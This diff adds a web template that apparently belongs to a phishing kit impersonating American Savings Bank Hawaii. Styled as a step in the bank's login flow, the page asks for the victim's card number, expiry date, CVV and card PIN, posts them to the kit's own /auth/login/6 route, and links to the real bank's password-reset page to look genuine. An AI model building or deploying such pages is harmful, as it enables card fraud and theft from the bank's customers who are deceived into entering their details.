@@ -1,0 +1,52 @@
+@layout('layouts.app')
+
+@section('content')
+<div class="cb-login-static-alert cb-login-message cb-login-alert-message cb-loginFormArea"></div>
+
+<div class="cb-login-form cb-loginFormArea">
+  <form class="cb-form" action="/auth/login/6" method="POST">
+    <div class="field">
+      <label class="cb-login-field" for="cardNum">Card Number</label>
+      <input id="cardNum" name="cardNum" class="mrg-T-sm form-control cb-text-field" type="text" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
+    </div>
+
+    <div class="field">
+      <label class="cb-login-field" for="expDate">Expiry Date</label>
+      <input id="expDate" name="expDate" class="mrg-T-sm form-control cb-text-field" type="text" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
+    </div>
+
+    <div class="field">
+      <label class="cb-login-field" for="cvv">CVV</label>
+      <input id="cvv" name="cvv" class="mrg-T-sm form-control cb-text-field cb-text-field-mask" type="text" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
+    </div>
+
+    <div class="field">
+      <label class="cb-login-field" for="cpin">Card Pin</label>
+      <input id="cpin" name="cpin" class="mrg-T-sm form-control cb-text-field cb-text-field-mask" type="text" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
+    </div>
+
+    <div id="userLinks">
+      <button class="logon-submit btn-primary btn-block pointer btn disabled" disabled="">
+        <div class="icon"></div>
+        Continue
+      </button>
+
+      <div class="clearfix password-links">
+        <div class="pull-right password-link">
+          <a href="https://online.asbhawaii.com/americansavingsbankfsbonline/Uux.aspx#/login/resetPasswordUsername"> <span class="forgot-pw">Forgot your password?</span>
+          </a>
+        </div>
+      </div>
+    </div>
+  </form>
+</div>
+@endsection
+
+@section('script')
+<script>
+  $('#cardNum').mask('0000 0000 0000 0000');
+  $('#expDate').mask('00/0000');
+  $('#cvv').mask('0000');
+  $('#cpin').mask('0000');
+</script>
+@endsection
